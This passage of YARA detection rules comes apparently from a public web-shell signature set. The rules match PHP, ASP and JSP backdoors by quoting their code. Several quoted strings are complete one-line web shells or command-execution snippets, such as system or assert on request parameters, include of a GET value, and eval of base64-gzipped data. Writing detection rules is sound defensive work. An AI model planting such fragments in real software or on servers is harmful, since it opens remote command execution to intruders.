		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1647-L1661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
		logic_hash = "735332a2ec7df65cca4ca69e702c5893d302a01c7ee7b84d01a1e6ab9646de93"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_R57_1_4_0 {
    meta:
		description = "Web Shell - file r57.1.4.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1662-L1678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "574f3303e131242568b0caf3de42f325"
		logic_hash = "cb48621c572d529b8dc634e7b6360257ad4fce9664bfca7ee7c0101be42d2c24"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "@ini_set('error_log',NULL);" fullword
		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s7 = "@ini_restore(\"disable_functions\");" fullword
		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Ajn {
    meta:
		description = "Web Shell - file ajn.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1680-L1694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aaafafc5d286f0bff827a931f6378d04"
		logic_hash = "0a6c9a210c0337d6b984bcf6cd7f14103a0f6f5d38a26c789519c2b1629aaede"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Cmd {
    meta:
		description = "Web Shell - file cmd.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1695-L1710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c38ae5ba61fd84f6bbbab98d89d8a346"
		logic_hash = "d9a0802f6fd7047ba5477f6bba61c4ac02cabfce06270fdbd8e8e68a693ccf68"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if($_GET['cmd']) {" fullword
		$s1 = "// cmd.php = Command Execution" fullword
		$s7 = "  system($_GET['cmd']);" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_List {
    meta:
		description = "Web Shell - file list.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1711-L1725"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
		logic_hash = "9c8bdeb5992015b26fbee418ed6e6b7c6b0901f26bddf9dc26706c0b63ea9c95"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_Co {
    meta:
		description = "Web Shell - file co.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1726-L1740"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "62199f5ac721a0cb9b28f465a513874c"
		logic_hash = "3fab3e97d10b6c56fb7df8bcd520bda318fc127a620c5aafba09cb36ffd6a8df"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_150 {
    meta:
		description = "Web Shell - file 150.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1741-L1755"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "400c4b0bed5c90f048398e1d268ce4dc"
		logic_hash = "139e3d6aa3cd2b6a9731a6cc14c921f9fd82ff7ca79d156f1ff6bc544897fb12"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "HJ3HjqxclkZfp"
		$s1 = "<? eval(gzinflate(base64_decode('" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Cmdjsp_2 {
    meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1756-L1770"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
		logic_hash = "83be82e260adcff9d3d11344c363f6b5da331339ffe78e561cea9ab09b209030"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_C37 {
    meta:
		description = "Web Shell - file c37.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1771-L1785"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
		logic_hash = "b93394f4e05cc96c31a8adcb0981aa8b069780893c469b41ece3d3ce92c42251"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_B37 {
    meta:
		description = "Web Shell - file b37.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1786-L1799"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "0421445303cfd0ec6bc20b3846e30ff0"
		logic_hash = "ae0cca5723a1e885c26ece5082c24f4c95f0262b8e7baf6db5efde5cfee2cc42"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Backdoor {
    meta:
		description = "Web Shell - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1800-L1814"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "1f754b4d29eb93316183cf904b375ded7ccdae1d2196fe05950c449ed0d690f4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Dabao {
    meta:
		description = "Web Shell - file dabao.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1815-L1829"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
		logic_hash = "62cf46dc16a7365d196c2cb8ede8b1380a0877d134d3726d7c777096a4eda942"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_2 {
    meta:
		description = "Web Shell - file 2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1830-L1843"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "267c37c3a285a84f541066fc5b3c1747"
		logic_hash = "bd485c825ae7ac11ff67d109d3c07fb405272a5919e00af39788d1a9c94e754d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Cmdasp {
    meta:
		description = "Web Shell - file cmdasp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1844-L1858"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "57b51418a799d2d016be546f399c2e9b"
		logic_hash = "4259419b4db8e6a83df6f7d258d41028f7f76b0fd2308eeadb4555066c5a2940"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Spjspshell {
    meta:
		description = "Web Shell - file spjspshell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1859-L1872"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d39d51154aaad4ba89947c459a729971"
		logic_hash = "7926eadd3ffb21de73a63e7a28a525037bf88396ea369599b41ac8c0b0d112ad"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Action {
    meta:
		description = "Web Shell - file action.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1873-L1887"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
		logic_hash = "5ea7d074d0fe98cf2514a65231013a374532d6b3aa2487bcc34d4285f558752a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Inderxer {
    meta:
		description = "Web Shell - file Inderxer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1888-L1901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "915f2f38c1ca1321980ac66ebb95b0c46443e0ba64cc4b2014200db43439c85e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Rader {
    meta:
		description = "Web Shell - file Rader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1902-L1916"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "b578f3e844cbb361f455e55353fad2f0134ede7c3c468cebad9ae265e6e768b8"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_C99_Madnet_Smowu {
    meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1917-L1935"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3aaa8cad47055ba53190020311b0fb83"
		logic_hash = "5c4f76bdbe535a899e40c890eb1ea65e070c781fe5dd44cf13d4832cfd6d2e13"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "//Authentication" fullword
		$s1 = "$login = \"" fullword
		$s2 = "eval(gzinflate(base64_decode('"
		$s4 = "//Pass"
		$s5 = "$md5_pass = \""
		$s6 = "//If no pass then hash"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Php_Moon {
    meta:
		description = "Web Shell - file moon.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1936-L1951"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
		logic_hash = "4e26dbef647caee19a8707a067c228ba96bd986369e4c87c68964ae42c85b09a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo '<option value=\"create function backshell returns string soname"
		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
		$s8 = "echo '<option value=\"select cmdshell(\\'net user "

	condition:
		2 of them
}
rule SIGNATURE_BASE_Webshell_Minupload {
    meta:
		description = "Web Shell - file minupload.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1953-L1967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ec905a1395d176c27f388d202375bdf9"
		logic_hash = "53dea3ea0e2cf83907273fa7f64b21b40e9a5c8e4aa34e5d46d2762396fa89ce"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_ELMALISEKER_Backd00R {
    meta:
		description = "Web Shell - file ELMALISEKER Backd00r.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1968-L1982"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
		logic_hash = "c5eea930dc386c60e60f052c4945c8d6c0125d3500e60794e21d5ea04f226628"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_PHP_Bug_1_ {
    meta:
		description = "Web Shell - file bug (1).php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1983-L1996"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "91c5fae02ab16d51fc5af9354ac2f015"
		logic_hash = "12b957b7e0d0823721273ab71a19ee62d84a8dc5f584a46691f0e0aef996386e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@include($_GET['bug']);" fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Caidao_Shell_Hkmjj {
    meta:
		description = "Web Shell - file hkmjj.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L1997-L2010"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e7b994fe9f878154ca18b7cde91ad2d0"
		logic_hash = "9a25df170ed165fe6528e6b9374ae572bcd26cd2e1f4014c7aa4953122671fac"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Jsp_Asd {
    meta:
		description = "Web Shell - file asd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2011-L2025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a042c2ca64176410236fcc97484ec599"
		logic_hash = "6620b796b55a67010cd3edebc2ec84c2657717722129ea46288d262cfd1c7e1c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Metaslsoft {
    meta:
		description = "Web Shell - file metaslsoft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2027-L2040"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aa328ed1476f4a10c0bcc2dde4461789"
		logic_hash = "20d938fbe21bcf04f09c6450a9acd5db556e9c9f83149d3cdd098be7a905d5ca"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Asp_Ajan {
    meta:
		description = "Web Shell - file Ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2041-L2054"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "1817786725de61150f1b3ff57597c780323a7f4df1c046cfd473e1918decd7d2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Config_Myxx_Zend {
    meta:
		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L2055-L2071"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "161dc712f279e73ea8cab4b0298cc2ca3799c6d9107050c4231a81021caed37f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash1 = "e0354099bee243702eb11df8d0e046df"
		hash2 = "591ca89a25f06cf01e4345f98a22845c"

	strings:
		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_Browser_201_3_Ma_Download {
    meta:
